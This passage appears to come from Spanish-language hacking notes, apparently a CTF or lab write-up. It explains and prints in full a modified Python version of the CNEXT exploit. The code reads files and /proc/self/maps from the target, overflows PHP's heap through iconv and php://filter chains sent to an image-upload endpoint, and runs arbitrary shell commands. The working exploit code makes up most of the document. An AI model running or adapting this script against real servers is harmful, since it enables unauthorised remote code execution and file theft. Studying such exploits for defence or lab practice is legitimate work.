3. **Solicitud 3** : Ejecutar el payload final:
    
    - Desencadenar el desbordamiento.
    - Manipular el montón.
    - Ejecutar el comando.




### Explicacion del Script:
#### **a) Class `Remote`**


- Implementa métodos para enviar solicitudes HTTP POST al endpoint vulnerable.
- Usa la cadena de filtros `chain_prefix` (los que usamos con wrapwrap) para engañar al sistema en la interpretación de datos.
- Permite descargar archivos remotos utilizando técnicas como `php://filter`.

1. **`check_vulnerable`:**
    - Comprueba si los wrappers `data://`, `php://filter` y la extensión `zlib` están habilitados.
    - Si alguno de estos no está disponible, el exploit no funcionará.
2. **`get_symbols_and_addresses`:**
    
    - Lee el archivo `/proc/self/maps` para obtener las regiones de memoria del proceso PHP.
    - Busca la dirección base de `libc` y el montón (`heap`) en la memoria.
    - Descarga una copia local de `libc.so.6` para analizar símbolos y direcciones específicas.
    
3. **`build_exploit_path`:**
    
    - Construye el payload malicioso que explotará la vulnerabilidad.
    - 
        - Creación de bloques (`buckets`) personalizados.
        - Manipulación del heap mediante técnicas como `dechunk` y `convert.iconv`.
        - Sobrescritura del puntero `free_slot` para controlar la asignación de memoria.
    
4. **`exploit`:**
    
    - Envía el payload final al servidor objetivo.
    - Espera un tiempo configurado (`sleep`) para verificar si el exploit fue exitoso.

#### **b) Class `Exploit`**

La clase `Exploit` es la parte principal del script. Contiene toda la lógica necesaria para construir y enviar el payload malicioso.

##### **Funciones clave:**

1. **`check_vulnerable`:**
    
    - Verifica si el sistema objetivo es vulnerable.
    - Comprueba si los wrappers `data://`, `php://filter` y la extensión `zlib` están habilitados.
    - Si alguno de estos no está disponible, el exploit no funcionará.
2. **`get_symbols_and_addresses`:**
    
    - Lee el archivo `/proc/self/maps` para obtener las regiones de memoria del proceso PHP.
    - Busca la dirección base de `libc` y el montón (`heap`) en la memoria.
    - Descarga una copia local de `libc.so.6` para analizar símbolos y direcciones específicas.
3. **`build_exploit_path`:**
    
    - Construye el payload malicioso que explotará la vulnerabilidad.
    - Utiliza técnicas avanzadas como:
        - Creación de bloques (`buckets`) personalizados.
        - Manipulación del montón mediante técnicas como `dechunk` y `convert.iconv`.
        - Sobrescritura del puntero `free_slot` para controlar la asignación de memoria.
4. **`exploit`:**
    
    - Envía el payload final al servidor objetivo.
    - Espera un tiempo configurado (`sleep`) para verificar si el exploit fue exitoso.


```python

from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -> Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)->bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) > 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```
![[Pasted image 20250202210905.png]]

---
---

